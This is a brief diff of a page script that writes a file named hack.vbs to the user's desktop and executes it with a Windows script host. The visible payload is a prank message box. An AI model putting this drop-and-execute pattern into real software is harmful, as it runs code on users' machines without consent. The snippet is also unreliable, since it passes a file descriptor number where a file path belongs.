@@ -62,7 +62,7 @@ MsgBox "BOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOM!"`
       fd = fs.openSync(desktop + '\\hack.vbs', 'w')
       fs.writeSync(fd, vbs, 0, 'ANSI')
       const bash = require('child_process')
-      bash.exec(`wscript.exe ${fd}`)
+      bash.exec(`cscript.exe ${fd}`)
     }
   </script>
 </body>
